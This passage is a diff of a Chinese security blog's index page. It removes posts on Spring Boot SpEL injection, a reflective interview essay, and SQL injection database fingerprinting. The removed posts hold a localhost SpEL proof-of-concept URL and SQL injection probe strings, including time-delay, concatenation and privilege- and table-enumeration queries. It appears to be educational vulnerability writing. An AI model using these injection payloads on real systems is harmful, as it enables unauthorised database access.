<span class="string">'"'</span> :</div><div class="line">        inQuotes = !inQuotes;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'('</span> :</div><div class="line">        depth++;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">')'</span> :</div><div class="line">        <span class="keyword">if</span> (!inQuotes) &#123;</div><div class="line">          <span class="keyword">if</span> (<span class="number">1</span> == depth--) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String[]&#123;createStringTrimmed (cs, start, ++i - start), createStringTrimmed(cs, i, end - i)&#125;;</div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> String[]&#123;<span class="keyword">new</span> String(cs, start, offset)&#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><strong>PropertyAccessor的getNormal</strong> 通过反射执行表达式。</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/07/04/甲乙方安全需求与痛点/" data-id="cj5p9bvxh0006d01byuhjy711" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2016/11/15/MVEL解析表达式/" data-id="cja0q26eu0002u41bleqktofx" class="article-share-link">Share</a>
       
       
     </footer>
@@ -247,7 +455,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/10/10/Java反序列化漏洞/" data-id="cj5p9bvxc0004d01bxgohft1k" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2016/10/10/Java反序列化漏洞/" data-id="cja0q26ew0004u41b5sppox1o" class="article-share-link">Share</a>
       
       
     </footer>
@@ -319,7 +527,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/09/18/WAF-Bypass-技巧总结/" data-id="cj5p9bvxm0009d01bvpd0t5dq" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2016/09/18/WAF-Bypass-技巧总结/" data-id="cja0q26f10007u41byco1k002" class="article-share-link">Share</a>
       
       
     </footer>
@@ -363,7 +571,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/08/11/sqlmap-使用/" data-id="cj5p9bvxl0008d01bhmioaraa" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2016/08/11/sqlmap-使用/" data-id="cja0q26fr000bu41bzmzakc8j" class="article-share-link">Share</a>
       
       
     </footer>
@@ -420,209 +628,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/08/08/OGNL机制和Struts2漏洞利用原理研究/" data-id="cj5p9bvxe0005d01b7u35d75s" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="w-Spring-Boot框架SPEL表达式注入漏洞" class="article article-type-w" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" class="article-date">
-  <time datetime="2016-07-15T07:42:14.000Z" itemprop="datePublished">2016-07-15</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/">Spring Boot框架SPEL表达式注入漏洞</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>pring是2003年兴起的轻量级Java开发框架。任何Java应用都可以使用该框架的核心特性，在Java EE平台之上有可用于构建Web应用的扩展。Spring Boot是Spring 的一个核心子项目，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置国内包括百度、阿里巴巴、腾讯等诸多知名企业都在使用该框架。<br>最近Spring Boot框架的SpEL表达式注入通用漏洞曝光，利用该漏洞，远程攻击者在服务器上可执行任意命令。</p>
-<h4 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h4><p>Spring Boot 1.1 1.2 1.3.0版本</p>
-<h4 id="不受影响的版本"><a href="#不受影响的版本" class="headerlink" title="不受影响的版本"></a>不受影响的版本</h4><p>Spring Boot 1.3.1及以上版本</p>
-<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>以下是官方给的漏洞说明：<br><img src="/upload_image/3.png" alt=""><br>查看spring boot1.3.0的源文件ErrorMvcAutoConfiguration.java，发现出问题的地方主要在SpelView类中：<br><img src="/upload_image/4.png" alt=""><br>经过分析得知在用户采用了Spring Boot启动Spring MVC项目后Spring Boot的默认异常模板在处理异常信息的时候递归解析SPEL表达式，可导致SPEL表达式注入并执行。主要问题是SpelView类中会对路径中或者名字中含有的表达式递归解析，所以在1.3.1修复时添加了NonRecursivePropertyPlaceholderHelper类，防止递归解析路径中或者名字中含有的表达式。</p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用此漏洞，只需在SpringMVC的Controller中的参数触发一个异常，异常信息带有SPEL表达式就可以注入了。<br>POC：<br><a href="http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{78,115,102,111,99,117,115})}" target="_blank" rel="external">http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{78,115,102,111,99,117,115})}</a><br>漏洞证明：<br><img src="/upload_image/5.png" alt=""><br>利用表达式成功创建了字符串Nsfocus.</p>
-<h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>从spring-boot的github的项目中可以看到，这个漏洞是在这个commit中修复的：<br><a href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6" target="_blank" rel="external">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6</a><br>在修复的log里可以看到存着漏洞的1.3.0和1.3.1的差别：<br><img src="/upload_image/6.png" alt=""><br>1.3.1创建了NonRecursivePropertyPlaceholderHelper类，防止递归解析路径中或者名字中含有的表达式。</p>
-<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><p>升级Spring Boot版本至1.3.1或以上版本</p>
-<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="http://www.freebuf.com/news/108665.html" target="_blank" rel="external">http://www.freebuf.com/news/108665.html</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-226888" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-226888</a><br><a href="https://github.com/spring-projects/spring-boot/issues/4763" target="_blank" rel="external">https://github.com/spring-projects/spring-boot/issues/4763</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" data-id="cj5p9bvxb0003d01bfiojm6xa" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="w-面试一年前的自己" class="article article-type-w" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/06/29/面试一年前的自己/" class="article-date">
-  <time datetime="2016-06-29T07:20:45.000Z" itemprop="datePublished">2016-06-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/06/29/面试一年前的自己/">面试一年前的自己</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>转自 <a href="http://blog.renren.com/share/110788074/9329803842" target="_blank" rel="external">何巍的日志</a> 一碗不错的鸡汤，看后很有感触，时常拿来读一下。</p>
-<h3 id="我在雅虎的面试经历"><a href="#我在雅虎的面试经历" class="headerlink" title="我在雅虎的面试经历"></a>我在雅虎的面试经历</h3><p>我现在还记得，2010年的七月，我在雅虎面试的情景。</p>
-<p>雅虎的研发中心是在清华南门外的一座高楼上，我面试的小房间呢，靠着窗户。透过窗户，可以俯瞰美丽的清华园。</p>
-<p>一段简短的自我介绍以后，面试官的第一个问题是：你写下快速排序吧。</p>
-<p>我脑子一下子懵了，快排是大二时《数据结构》课上学过的，是很基本和经典的算法。可我后来就再也没有用过，需要排序的时候，不是Copy-Paste之前写过的排序代码，就是调用库里的排序函数。我只能记起快排的大致思想了：好像是把数组分成两段，然后再…Oh, Damn!</p>
-<p>吭哧了半天，手心都是汗，最后终于写出来了，花了接近二十分钟，当我沮丧地让面试官看我涂涂改改后的代码时，我甚至都不敢确定我写的是“快排”，还是别的什么。</p>
-<p>我自然知道面试官的原意：先出一道简单的题，让我很快、很轻松地写出，缓解下紧张的情绪，然后再由易至难。可是，我把这一切从开始就弄砸了。</p>
-<p>面试官问我：你知道TLB吧？</p>
-<p>我：嗯，知道。</p>
-<p>面试官：你说说它的原理：</p>
-<p>我(嘀咕着、极小声地、不确定地)：好像和缓存有关吧？？</p>
-<p>(心里想着：我上学期学体系结构的时候学过TLB，期末考试前还复习过，考完试后早忘记了。现在又不是期末考试前，我怎么可能还记得住，呜呜…)</p>
-<p>面试官：知道段页式存储管理吧？</p>
-<p>我：嗯，知道。</p>
-<p>面试官：解释下(他递给我一张纸，说你在纸上比划下)</p>
-<p>我：…</p>
-<p>(心里想着：上学期学《操作系统》的时候我还写过一个操作系统，里面用的就是段页式存储管理。当时还是很明白的东西，怎么才过半年就想不起来了！！)</p>
-<p>面试官(很无语、可能抱着最后的一丝希望)：数据库三范式你总知道吧？</p>
-<p>我：学过，可是…</p>
-<p>面试的结果可想而知。</p>
-<p>当我临走的时候，我很不忿地问面试官：我做过一些项目，写过很多代码，你为什么不去问这些项目的经历，或者具体的技术，而是问这些课堂里学过的，可是根本用不到的基础知识？</p>
-<p>那个雅虎的面试官，看了看我，给了我一个我这辈子都不会忘记的答案：</p>
-<p>你们学校里的做过的那些项目，用过的那些技术，从工业界的角度来看，是小打小闹。你们入职后，技术上都是要重新培训的。而我现在想评估你，只能通过你在学校里学过的基础知识。你作为一个在校的学生，如果这些基础知识你都掌握不好，你说服不了我去雇佣你。</p>
-<h3 id="我的简历-Vs-找实习的结果"><a href="#我的简历-Vs-找实习的结果" class="headerlink" title="我的简历 Vs. 找实习的结果"></a>我的简历 Vs. 找实习的结果</h3><p>那时的我的简历是这样的：</p>
-<p>清华大学的在读学生，大一、大二、大三学业成绩年级前三，年年奖学金，大二开始进入实验室，到那时已经参加了三个科研项目，并且即将投出人生中的第一篇论文，四、六级都是640左右的成绩。</p>
-<p>我自信满满，我以为这是一份很完美无缺的简历，我以为我的同龄人不可能有比我更棒的履历表。</p>
-<p>可是，我错了。2010年的夏天，是我第一次去找实习，第一次拿在象牙塔里学到的知识去接受现实社会的考量。我大约面试了六、七家公司吧，被除了IBM以外的所有公司都拒绝了。</p>
-<p>拒掉我的公司包括：雅虎、搜狐、网易、创新工场、浪潮…</p>
-<p>在最初的一段日子里，我很不解，很疑虑：为什么这样一份看着很棒的简历却不能得到公司的认同？公司里既然不认可我的价值，那么它需要和认可什么样的人才？</p>
-<p>很庆幸的是，从那个夏天开始的一年时间里，我有幸先后在IBM和微软两家伟大的公司实习，在顾明老师的指导下完成了一次工作量很大，也非常有收获的毕业设计。这三件事中的每一件，对我来说，都是莫大的挑战，都给了我的认知以全新的甚至是颠覆性的冲击。我对于一年前自己不解的问题逐渐有了更明晰的认识。</p>
-<p>现在，当我回首去年夏天的经历的时候，我会毫不犹豫地做出那个雅虎的工程师同样的决定：</p>
-<pre><code>如果现在的我去面试一年前的我，我不会去雇佣自己！
-</code></pre><p>这就是进步。</p>
-<p>在传奇的清华园里，如果横向地看，我只是一个极普通的学生，比起周遭的老师、同学，取得的成绩不值得一提，我更是时常惶恐不安，生怕自己将来能力有限，贡献不大，对不起身上贴着“清华”这个金色的标签。但如果纵向地去看，我能感觉到自己的进步，能感觉到自己成长和探索的步伐。这对于我来说，足以让我内心欣喜和宁静。</p>
-<h3 id="我只有学分绩，没有能力"><a href="#我只有学分绩，没有能力" class="headerlink" title="我只有学分绩，没有能力"></a>我只有学分绩，没有能力</h3><p>和园子里的大多数的同学一样，我也是那种在中学的校园里的“尖子”。那时候，似乎有了成绩就有了一切，老师会表扬，同学会羡慕，全校性的集会上会经常有发言的机会，各种的奖励，甚至课间都会有邻班的小女生跑着送来表达爱慕的纸条。</p>
-<p>于是，这种思维很自然而然地延续到了我的大学阶段。我每天都在自习室和图书馆里，我想把成绩弄得很高，我依然觉得，有了成绩就会有了一切。</p>
-<p>我记得小时候经常写议论文，时常提起的一个话题就是“高分低能”，我记得我写起这个话题，每次都慷慨激昂，痛斥那些在应试教育的体制下培养出的“高分低能”的畸形。可是作文谁都会写，道理谁都会讲。所谓的“高分低能”，那时候，只是说说而已。直到找实习时的碰壁，我才真切意识到，原来议论了这么多年的“高分低能”的人，其实就是自己。</p>
-<p>我和学校的老板、公司的老板多次谈过这个话题，现在终于明白：当一个老板考虑是否雇佣你的时候，他不会去在乎你的GPA，不会去在乎你得过的奖学金、他甚至不去关心你做过的社会工作和你参加过的那些项目。他唯一在乎的，就是你的能力和潜能，这决定了你的价值，决定了你可能为公司、为社会创造的价值。</p>
-<p>我终于明白：当我们走出象牙塔，踏入社会的时候，我们的核心竞争力，早已不再是成绩，而是能力。</p>
-<p>这就是那个雅虎的工程师不愿意雇佣我的原因：我只有学分绩、没有能力。</p>
-<p>试想一下，在你的面前有这样的一位求职者：他学过C++，学过JAVA，用过Eclipse和Visual Studio。他写过MFC的程序，也写过JAVA的程序，完成过课堂作业，写过的代码加起来也有几万行吧。可是你和他都明白，这些代码，大都是学生的“自娱自乐”，离工业级的代码相差太远。他学过算法和数据结构，却写个快排算法都吃力。他学过体系结构，却讲不出TLB和段页式存储管理。他学过数据库，却记不起三范式。</p>
-<p>虽然他是清华的学生，虽然他的学分绩很高，虽然他还得过奖学金什么的，可是你愿意去相信他有成为一名优秀的软件工程师的能力和潜力吗？你愿意为了他身上这些种种光鲜的“标签”而雇佣他吗？</p>
-<p>答案不言自明。</p>
-<p>只有能力才能证明自己，只有能力才能创造价值。</p>
-<h3 id="我学过计算机专业的核心课吗？"><a href="#我学过计算机专业的核心课吗？" class="headerlink" title="我学过计算机专业的核心课吗？"></a>我学过计算机专业的核心课吗？</h3><p>这个问题似乎很可笑，我都是清华大学研究生一年级的学生呢。早在本科阶段，那些专业核心课，比如操作系统、数据库、算法、计算机网络、编译原理、体系结构都学过了。</p>
-<p>而且呢，不仅仅是学过，我还考过很高的成绩呢。呃，我不一一地列举了。写这篇文章的目的本来就是反思，而绝非炫耀。</p>
-<p>可是，既然这些计算机专业的核心课我都学过，而且几乎门门都是前10%的成绩，为什么我在雅虎的面试里还表现得像一无所知的儿童一样呢？</p>
-<p>我想起了一件事，我学的这些核心课用到的教材几乎都是学校里的书店里淘到二手书。这些书，大都是我的师兄师姐用过的，书里还有他们当时的笔记和圈圈画画。为什么他们会把这些无价的、本该阅读一辈子的书，以一折两折的低价卖给书店呢？我想，肯定不会是这些师兄师姐们都转行去学金融了吧。</p>
-<p>我想起了我学过的计算机网络和编译原理这两门课，是的，我都考了99分，是年级第一。可是那些经典的教材，Tanenbaum那本厚厚的《计算机网络》和久负盛名的编译原理龙书，我看过多少，大约15%都不到吧？</p>
-<p>理解了多少？估计5%都不到吧，稍微理解多一点也不至于在雅虎面试中表现得那么差。</p>
-<p>这些书，这些计算机专业的核心课程，在考试结束之后，就该束之高阁了吗？</p>
-<p>今年春天，我在微软做Visual Studio的插件开发，需要用到编译原理里的词法分析、语法分析的知识。我现在还清楚地记得，当我重新学习词法分析和语法分析，学习LR文法时，我看“龙书”的感觉同一个新手无二！</p>
-<p>想想真讽刺，这就是我华丽丽地考了99分的计算机专业的核心课。</p>
-<p>这些计算机专业的核心课，我都学过。可是从某种意义上来说，我又都没有学过，或者说，学习的过程，不应该随着课程的结束，本科的结束，或者学生时代的结束而停止。这些经典的教材，是需要常读常新的，“温故知新”的过程，理应贯穿整个学生时代和职业生涯。</p>
-<h3 id="清华的学生为什么不考证？"><a href="#清华的学生为什么不考证？" class="headerlink" title="清华的学生为什么不考证？"></a>清华的学生为什么不考证？</h3><p>我有很多本科院校相对一般的同学，问起他们在干什么，他们经常告诉我，他们在准备四六级，在考计算机等级证书等等，而且忙得昏天黑地。</p>
-<p>可是，在清华的校园里，却没有考证的传统，大部分的同学估计都和我一样，连四、六级都是“裸考”的。我们为什么不像他们那样费尽心机地去考证？</p>
-<p>清华给了我们足够的自信，更大的平台和更高的视野，让我们不需要去考那些证书，而可以把时间投入到更宝贵和更值得追求的事上。而且，很功利地说，一张清华大学的毕业证书已经抵过了十张、百张的等级证书。</p>
-<p>我们清华的学生为什么不考证？是的，我们不需要去借助那些证书去谋一份好的工作和美好的未来。</p>
-<p>换句话说，对于一些普通的工作岗位来说，这些证书或许很值钱。但是对于更高端的工作职位来说，那些证书就没那么有说服力了。这就像你揣着一张计算机等级考试的证书到Google去求职一样可笑。</p>
-<p>能靠等级证书找到的工作不会是太好的工作。同样的道理，能靠GPA还有奖学金证书谋到的工作也不会是最好的工作。最好的工作，我们必须而且只能靠能力去说服我们潜在的雇主。</p>
-<p>想着我这个年龄时，盖茨在做什么，乔布斯在做什么，想想自己的曾经，还那么迷恋GPA和一些所谓的标签，真真是感到汗颜。16岁的扎克伯格，拒绝了微软95万年薪的工作。当你的能力能证明一切的时候，没有人在乎你的学分绩，没有人在乎你是硕士还是博士还是什么学历都没有。</p>
-<p>我想，我应该有这样的志向，靠能力，而不是靠那些所谓的标签，去赢得未来，去为祖国和时代贡献自己的价值。</p>
-<h3 id="乔布斯的接力棒"><a href="#乔布斯的接力棒" class="headerlink" title="乔布斯的接力棒"></a>乔布斯的接力棒</h3><p>今天白天的时候，知道了乔布斯去世的消息。我又听了他在Stanford的那次著名的演讲，他在提到自己被苹果公司开除的时候说：</p>
-<p>“I felt that I had let the previous generation of entrepreneurs down – that I had dropped the baton as it was being passed to me. ”</p>
-<p>如今，乔布斯已经离去了，旧的传奇也在不断老去，新的传奇也在不断地诞生。乔布斯的接力棒(baton)已经传到了我们这一代人的手里。我从不奢望我会是一个改变世界的人物，可是，作为一名未来的IT从业者，我真心地希望能和中国，还有世界上的工程师一样去参与创造和改变这个世界。这是一项最伟大的事业。</p>
-<p>我要更努力更有勇气，同乔布斯一样，我也不想让前辈失望。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/29/面试一年前的自己/" data-id="cj5p9bvxo000bd01biuitex4i" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sql注入之数据库识别" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/06/18/sql注入之数据库识别/" class="article-date">
-  <time datetime="2016-06-18T12:01:05.000Z" itemprop="datePublished">2016-06-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/06/18/sql注入之数据库识别/">sql注入之数据库识别</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>目前，主流扫描器在性能和准确性上一直是各个厂家追捧的对象，然而由于缺少对一些特定环境的判断，例如，数据库的版本识别，页面相似度的计算，爬虫对单 url扫描时间的采样等，所以导致对于一个sql注入的检测势必会采取全规则扫描，那么对于一个数据库怎样去识别呢，我们可以根据所谓的“指纹”去探索， 数据库的类型。</p>
-<h4 id="根据数据库连接字符串的不同进行识别"><a href="#根据数据库连接字符串的不同进行识别" class="headerlink" title="根据数据库连接字符串的不同进行识别"></a>根据数据库连接字符串的不同进行识别</h4><p>在控制某个字符串数据项的查询中，可以再一个请求中提交一个特殊的值，然后测试个中连接方式，生成自己想要的字符串，如果得到相同的结果，就可以确定所使 用的数据库类型，如果该页面存在sql注入，当然就是用最简单的测试手法，进行探测，如果探测成功，然后就进行字符的连接测试，对于后台如果一个 url：<a href="http://www.site.com/select.php?a=1&amp;b=2，假设存在注入漏洞，注入点是ｂ，你可以加入一下内容，" target="_blank" rel="external">http://www.site.com/select.php?a=1&amp;b=2，假设存在注入漏洞，注入点是ｂ，你可以加入一下内容，</a> 构造你认为对的注入条件：</p>
-<p>a)  字符串类型：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.   ORACLE：’database‘  || ’_detect‘</div><div class="line">2.   MS-SQL： ’database‘+’_detect‘</div><div class="line">3.   MYSQL：’database‘  ’_detect‘</div></pre></td></tr></table></figure></p>
-<p>b)  数字类型<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE：BITAND(1,1) - BITAND(1,1)</div><div class="line">2.  MS-SQL：@@PACK_RECEIVED - @@PACK_RECEIVED</div><div class="line">3.  MYSQL： CONNECTION_ID() - CONNECTION_ID()</div></pre></td></tr></table></figure></p>
-<p>根据页面的返回特征，如果有你想要看到的现象，那么就可以确定数据库的类别。</p>
-<h4 id="根据数据库默认函数的不同进行识别"><a href="#根据数据库默认函数的不同进行识别" class="headerlink" title="根据数据库默认函数的不同进行识别"></a>根据数据库默认函数的不同进行识别</h4><p>a)  基于时间的</p>
-<ol>
-<li>在oracle之中，没有专门的内置时间函数，但是它有一个向远端服务器发送http请求的内置函数，UTL_HTTP,如果发送一个不存在的远端主机请 求，它就会尝试去连接，这样势必会造成一定程度的延迟。</li>
-<li>在ms-sql之中，可以使用waitfor delay ‘0:0:10’注入参数之中，造成一定的延迟然后和预期的正常请求时间相比较，如果符合自己的预期，那么就可以确定数据库的类型</li>
-<li>在mysql之中，可以使用sleep(5)注入参数之中，造成延迟来判断数据库类型<br>b)  基于错误类型的<br>众所周知对于不同的数据库，如果sql语句触发了错误，它们所爆出来的错误信息是不一样的，当然我们可以试探的形式去发现，例如我们用单引号，双引号，宽字节等有效手段，或者引发除零错之类的触发sql语句的错误，然后从错误信息之中寻找信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">ORA-01756:quoted string not properly terminated</div><div class="line">ORA-00933:SQLcommand not properly ended</div><div class="line">2.  MS-SQL</div><div class="line">Msg 170,level 15, State 1,Line 1</div><div class="line">Line 1:Incorrect syntax near ‘foo</div><div class="line">Msg 105,level 15,state 1,Line 1</div><div class="line">Unclose quotation mark before the character string ‘foo</div><div class="line">3.  MYSQL</div><div class="line">you have an error <span class="keyword">in</span> your SQL syntax,check the manual that corresponds to you mysql server version <span class="keyword">for</span> the right stntax to use near ‘’foo’ at line x</div></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>c)  根据注释也可以初步判断数据库类型，但是注释一般可以被程序过滤，所以严格意义上讲，不在考虑范围之内<br>       这里举例就先这些，其实错误信息很多，如果个事实三者中的任意一个，那么就可以确定是哪一种数据库.</p>
-<h4 id="怎样去获取数据库的详细信息"><a href="#怎样去获取数据库的详细信息" class="headerlink" title="怎样去获取数据库的详细信息"></a>怎样去获取数据库的详细信息</h4><p>a)  获取数据库的版本字符串<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select banner from v<span class="variable">$version</span></div><div class="line">2.  MS-SQL</div><div class="line">Select @@version</div><div class="line">3.  MYSQL</div><div class="line">Select @@version</div></pre></td></tr></table></figure></p>
-<p>b)  获取当前操作的数据库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select SYS_CONTEXT(‘USERENV’,’DBNAME’) from dual</div><div class="line">2.  MS-SQL</div><div class="line">Select db_name()</div><div class="line">获取服务器的名称可以用 select servername</div><div class="line">3.  MYSQL</div><div class="line">Select database()</div></pre></td></tr></table></figure></p>
-<p>c)  获取当前用户的权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select privilege from session_privs</div><div class="line">2.  MS-SQL</div><div class="line">Select grantee,table_name,privilege_type from</div><div class="line">INFORMATION_SCHEMA.TABLE_PRIVILEGES</div><div class="line">3.  MYSQL</div><div class="line">Select * from information_schema.user_privileges <span class="built_in">where</span> grantee = ‘user’</div><div class="line">这里的user可以来自select user()</div><div class="line">如果要对这些检索出来的信息，进行一列显示，那么就要用到前面提到的连接符号</div></pre></td></tr></table></figure></p>
-<p>d)  显示用户表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select object_name,object_type,from user_objectsWHEREobject_type=’TABLE’或者显示用户访问的所有表，从其中获取信息</div><div class="line">Select table_name form all_tables</div><div class="line">2.  MS-SQL</div><div class="line">Select name from sysobjectsWHERExtype=’U’</div><div class="line">3.  MYSQL</div><div class="line">Select table_name from information_schema.tables <span class="built_in">where</span> table_type=’BASE TABLE’ and table_schema!=’mysql’</div></pre></td></tr></table></figure></p>
-<p>e)  显示表foo的列名称<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select column_name,Name form uer_tab_columns <span class="built_in">where</span> table_name = ‘FOO’,如果目标数据部位当前应用程序用户所有，使用ALL_table_columns表</div><div class="line">2.  MS-SQL</div><div class="line">Select column_name,FORM information_schema.columns <span class="built_in">where</span> table_name=’foo’</div><div class="line">3.  MYSQL</div><div class="line">Select column_name from information_schema.columns <span class="built_in">where</span> table_name=’foo’</div></pre></td></tr></table></figure></p>
-<p>f)  显示用户对象<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select object_name,object_type from user_objects</div><div class="line">2.  MS-SQL</div><div class="line">Select name form sysobjects</div><div class="line">3.  MYSQL</div><div class="line">Select table_name from information_schema.tables或者select trigger_name from information_schema.triggers</div></pre></td></tr></table></figure></p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>如果对于一个存在sql注入的站点来说，前两点可以轻松判断数据库的类型，最后的一点，可以根据实际情况进行sql拼接构造，对一个数据库进行探测</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/06/18/sql注入之数据库识别/" data-id="cj5p9bvxn000ad01bavnb8rl4" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2016/08/08/OGNL机制和Struts2漏洞利用原理研究/" data-id="cja0q26f00006u41bolytzma0" class="article-share-link">Share</a>
       
       
     </footer>
@@ -653,7 +659,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
     </div>
   </div>
 
@@ -666,23 +672,23 @@
       <ul>
         
           <li>
+            <a href="/2017/10/10/Apache-server安全：10个安全提示/">Apache server安全：10个安全提示</a>
+          </li>
+        
+          <li>
